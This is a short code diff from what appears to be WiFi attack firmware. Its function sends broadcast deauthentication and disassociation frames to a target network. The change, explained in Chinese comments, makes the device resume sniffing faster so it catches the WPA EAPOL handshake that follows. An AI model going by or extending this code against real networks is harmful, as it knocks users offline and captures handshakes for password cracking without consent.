@@ -864,8 +864,10 @@ void deauthAndSniff() {
       const uint16_t reasonsE[2] = {7, 1};
       for (int r = 0; r < 2; r++) { wifi_tx_broadcast_deauth(deauth_bssid, reasonsE[r], 80, 150); }
       wifi_tx_broadcast_disassoc(deauth_bssid, 8, 10, 200);
-      resumeCaptureAfterDeauth(2000);
+      // 尽快恢复混杂模式，避免错过随后的EAPOL（将原2000ms离线等待改为在线等待）
+      resumeCaptureAfterDeauth(100);
       wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
+      delay(1900);
       // 不增加 attempts，直接进入下一轮嗅探窗口
       continue;
     }
